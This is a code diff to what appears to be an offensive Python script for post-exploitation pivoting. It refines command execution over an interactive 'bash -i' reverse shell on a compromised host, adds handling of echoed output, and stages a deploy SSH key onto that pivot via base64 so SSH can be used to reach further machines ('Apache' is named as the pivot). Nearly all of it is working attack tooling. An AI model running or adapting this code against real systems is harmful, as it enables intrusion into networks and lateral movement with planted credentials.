@@ -52,7 +52,13 @@ def _send_shell_command(shell, command):
 
 def _run_pivot_command(shell, command, timeout=8):
     marker = f"__END_{int(time.time() * 1000)}__"
-    wrapped = f"{command}; echo {marker}"
+    # bash -i echoes every command back through the socket, so the marker text
+    # appears twice: once in the echoed "...; echo <marker>" line and once as
+    # the real output of that echo.  We wait for "\n<marker>\n" which only
+    # matches the real output (on its own line), then strip the echo prefix.
+    actual_marker = "\n" + marker + "\n"
+    echo_suffix = "; echo " + marker
+    wrapped = f"{command}{echo_suffix}"
     _send_shell_command(shell, wrapped)
 
     response = ""
@@ -69,12 +75,20 @@ def _run_pivot_command(shell, command, timeout=8):
             if not chunk:
                 continue
             response += chunk
-            if marker in response:
+            if actual_marker in response:
                 break
     finally:
         shell.settimeout(prev_timeout)
 
+    if actual_marker in response:
+        # Split off everything after the real marker, then strip the echoed
+        # command prefix (everything up to and including "; echo <marker>").
+        pre_marker = response.split(actual_marker)[0]
+        if echo_suffix in pre_marker:
+            return pre_marker.split(echo_suffix)[-1].lstrip("\n")
+        return pre_marker
     if marker in response:
+        # Fallback: no bash echo (non-interactive context), marker found once.
         return response.split(marker)[0]
     return response
 
@@ -108,13 +122,19 @@ def _build_ssh_command_string(key_path, user, host, port, remote_cmd, ssh_bin="s
 
 
 def _stage_key_via_pivot(shell, local_key_path, remote_key_path):
+    # Remove any pre-existing file that might be owned by a different uid and
+    # would block the redirect even for root (Docker user-namespace edge case).
+    _run_pivot_command(shell, f"rm -f {shlex.quote(remote_key_path)}", timeout=3)
     base64_check = _run_pivot_command(
-        shell, "test -x /usr/bin/base64 && echo BASE64_OK", timeout=2
+        shell,
+        "for b in /usr/bin/base64 /bin/base64; do [ -x \"$b\" ] && echo \"BASE64_OK $b\" && break; done",
+        timeout=2,
     )
     if "BASE64_OK" in base64_check:
+        b64_bin = base64_check.split("BASE64_OK ")[-1].split()[0].strip()
         key_b64 = base64.b64encode(Path(local_key_path).read_bytes()).decode()
         cmd = (
-            f"printf %s {shlex.quote(key_b64)} | base64 -d > {shlex.quote(remote_key_path)} "
+            f"printf %s {shlex.quote(key_b64)} | {b64_bin} -d > {shlex.quote(remote_key_path)} "
             f"&& chmod 600 {shlex.quote(remote_key_path)} "
             f"&& test -s {shlex.quote(remote_key_path)} && echo KEY_OK"
         )
@@ -381,13 +401,13 @@ def run(
         sanity = _run_pivot_command(
             pivot_shell,
             "test -x /usr/bin/ssh && echo SSH_OK || echo SSH_MISSING; "
-            "test -x /usr/bin/base64 && echo BASE64_OK || echo BASE64_MISSING",
+            "{ test -x /usr/bin/base64 || test -x /bin/base64; } && echo BASE64_OK || echo BASE64_MISSING",
             timeout=3,
         )
         if "SSH_MISSING" in sanity:
             print("[-] Pivot shell missing /usr/bin/ssh")
         if "BASE64_MISSING" in sanity:
-            print("[-] Pivot shell missing /usr/bin/base64")
+            print("[-] Pivot shell missing base64 (checked /usr/bin/base64 and /bin/base64)")
         if not _stage_key_via_pivot(pivot_shell, deploy_key_file, pivot_key_path):
             print("[-] Failed to stage deploy key on Apache")
             server_socket.close()
